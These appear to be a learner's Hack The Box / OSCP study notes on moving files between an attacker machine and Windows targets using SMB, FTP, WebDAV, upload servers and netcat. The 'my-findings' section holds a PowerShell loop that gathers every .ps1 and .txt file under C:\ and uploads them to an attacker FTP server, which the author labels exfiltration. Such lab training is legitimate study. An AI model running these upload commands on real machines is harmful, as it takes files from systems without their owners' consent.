...
```bash
0xxNosystemisSafe@htb[/htb]$ md5sum id_rsa
...
```bash
0xxNosystemisSafe@htb[/htb]$ cat id_rsa |base64 -w 0;echo
...
###### explanation of the above powershell commands
`[IO.File]::WriteAllBytes()` io.file => io is a class , file is a class in io namespace and by default we are querying system.io.file class
...
**note** => if the file is short or a one liner dont do this step just review the contents 
...
we are creating a object of a class net.webclient with this portion `(new-object net.webclient)` then using a method with the object 
...
```shell
0xxNosystemisSafe@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare
...
***NOTE*** => **we have to  enable smb2support  in newer windows machines  because smb1 is  not  working in my case . so we have to use smb2 . In smb2 we get ntlm hash of the user connecting to the server . but if we dont have creds protecting the share . i encountered that it will not work . the latest version of smbserver may have this issue . so do set creds on the smbserver share and then it will be ok** . copy move copy-item is not working i have to mount that share with net use to get the file 

#### Create the SMB Server with a Username and Password


```shell
0xxNosystemisSafe@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
...
PowerShell has its own cmdlets like `New-PSDrive` for mapping drives, which provides additional flexibility and integration with PowerShell scripting. For example:
...
```shell
0xxNosystemisSafe@htb[/htb]$ sudo pip3 install pyftpdlib
```
...
```shell
0xxNosystemisSafe@htb[/htb]$ sudo python3 -m pyftpdlib --port 21
...
  
```shell
0xxNosystemisSafe@htb[/htb]$ echo  | base64 -d > hosts
```


```shell
0xxNosystemisSafe@htb[/htb]$ md5sum hosts 
...
```shell
0xxNosystemisSafe@htb[/htb]$ pip3 install uploadserver
...
  
```shell
0xxNosystemisSafe@htb[/htb]$ python3 -m uploadserver
...
```powershell
PS C:\htb> System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
...
```shell
0xxNosystemisSafe@htb[/htb]$ nc -lvnp 8000
...
```shell
0xxNosystemisSafe@htb[/htb]$ echo <base64> | base64 -d -w 0 > hosts
```
...
```shell
0xxNosystemisSafe@htb[/htb]$ sudo pip3 install wsgidav cheroot
...
```shell
0xxNosystemisSafe@htb[/htb]$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 
...
**note** => we are writing to the root directory of this smb server so we need root priviledge to write on any dir
we also need to envoke the virtual environment with root privs .we cannot use  sudo it will not help we have to change the user to root to execute this command in this virtual environment as root 
...
**Note2**: it is not working when i tried on 2024-11-28 . i can access it on browser but i cannot use copy item from my win machine to this server . priviously when i tried this i dont remember what was the actual problem or this methods worked or not but i know that there was a problem with this implementation i tried mounting this i tried different ports and i tried another dir and with root access but no succcess 
...
```shell
0xxNosystemisSafe@htb[/htb]$ sudo python3 -m pyftpdlib --port 21 --write
...
**note** => when u are running this ftp python module first u have to create a venv or virtual environment to download this module and then u have to run . keep this in mind that you have to run this module with root priviledge bcz here we are writing to the file system so it needs permission . if u run the above command and u havent started the virtual environment with root priviledges . the sudo will not work here . **so just change the user to root and then run it** 
#### PowerShell Upload File

|Method|Description|
|---|---|
|[OpenWrite](https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient.openwrite?view=net-9.0)|Retrieves a [Stream](https://learn.microsoft.com/en-us/dotnet/api/system.io.stream?view=net-9.0) used to send data to the resource.|
|[OpenWriteAsync](https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient.openwriteasync?view=net-9.0)|Retrieves a [Stream](https://learn.microsoft.com/en-us/dotnet/api/system.io.stream?view=net-9.0) used to send data to the resource, without blocking the calling thread.|
|[UploadData](https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient.uploaddata?view=net-9.0)|Sends a byte array to the resource and returns a [Byte](https://learn.microsoft.com/en-us/dotnet/api/system.byte?view=net-9.0) array containing any response.|
|[UploadDataAsync](https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient.uploaddataasync?view=net-9.0)|Sends a [Byte](https://learn.microsoft.com/en-us/dotnet/api/system.byte?view=net-9.0) array to the resource, without blocking the calling thread.|
|[UploadFile](https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient.uploadfile?view=net-9.0)|Sends a local file to the resource and returns a [Byte](https://learn.microsoft.com/en-us/dotnet/api/system.byte?view=net-9.0) array containing any response.|
|[UploadFileAsync](https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient.uploadfileasync?view=net-9.0)|Sends a local file to the resource, without blocking the calling thread.|
|[UploadValues](https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient.uploadvalues?view=net-9.0)|Sends a [NameValueCollection](https://learn.microsoft.com/en-us/dotnet/api/system.collections.specialized.namevaluecollection?view=net-9.0) to the resource and returns a [Byte](https://learn.microsoft.com/en-us/dotnet/api/system.byte?view=net-9.0) array containing any response.|
|[UploadValuesAsync](https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient.uploadvaluesasync?view=net-9.0)|Sends a [NameValueCollection](https://learn.microsoft.com/en-us/dotnet/api/system.collections.specialized.namevaluecollection?view=net-9.0) to the resource and returns a [Byte](https://learn.microsoft.com/en-us/dotnet/api/system.byte?view=net-9.0) array containing any response, without blocking the calling thread.|
|[UploadString](https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient.uploadstring?view=net-9.0)|Sends a [String](https://learn.microsoft.com/en-us/dotnet/api/system.string?view=net-9.0) to the resource and returns a [String](https://learn.microsoft.com/en-us/dotnet/api/system.string?view=net-9.0) containing any response.|
|[UploadStringAsync](https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient.uploadstringasync?view=net-9.0)|Sends a [String](https://learn.microsoft.com/en-us/dotnet/api/system.string?view=net-9.0) to the resource, without blocking the calling thread.|
#my-findings 

^my-findings
```powershell
$files=gci -path C:\<path> -include *.ps1,*.txt -file -recurse | select-object FullName

-->added duplicate overrite with adding prefix of a number thanks to chatgpt i dontk now hwo to do that 


$seen = @{} ; foreach ($file in $files.FullName) { $file_name = Split-Path -Path $file -Leaf ; $base = [IO.Path]::GetFileNameWithoutExtension($file_name) ; $ext = [IO.Path]::GetExtension($file_name) ; if (-not $seen.ContainsKey($file_name)) { $seen[$file_name] = 0 } ; $i = $seen[$file_name] ; $seen[$file_name]++ ; $new = if ($i -gt 0) { "$base" + "_$i" + "$ext" } else { $file_name }; Write-Host "Uploading $file as $new"; (new-object net.webclient).uploadFile("ftp://192.168.45.206/$new","$file")}

=>powershell script .ps1 file 

$files = Get-ChildItem -Path "C:\" -Include *.ps1, *.txt -Recurse -File | Select-Object -ExpandProperty FullName
	foreach ($file in $files) {
	     $file_name = Split-Path -Path $file -Leaf
	     $key = "$file_name" ; write-host $key ;$base = [IO.Path]::GetFileNameWithoutExtension($key)
	     $ext = [IO.Path]::GetExtension($key)
	
	     if (-not $seen.ContainsKey($key)) { $seen[$key] = 0 }
	     $i = $seen[$key]
	     $seen[$key]++
		 $new = if ($i -gt 0) { "$base" + "_$i" + "$ext" } else { $key }
	
	    Write-Host "Uploading $file as $new"
	     (New-Object Net.WebClient).UploadFile("ftp://192.168.45.207/$new", $file)
	 }

==>this will upload all the files to our ftp server plain and simple way tto upload from powershell 


==>if you uploaded to a dir which is a parent mv to a child dir with this command using find to map last 30 min file modified and getting the path and upload it in a subfolder 

mv $(find ~/oscp/web -type f -mmin -30) uploads-via-exfilteraton
           
``` 

we need a mechanism to catch the files and send them appropritate places 


```powershell
PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')

(new-object net.webclient).uploadFile("ftp://192.168.1.13/power2.ps1","C:\users\ieuser\desktop\backup-ob2.ps1") 
```

 `ftp-hosts` => **this name will be used as file name of the file which we are uploading on the remote server**   
 if u named it different it will be rename to that 
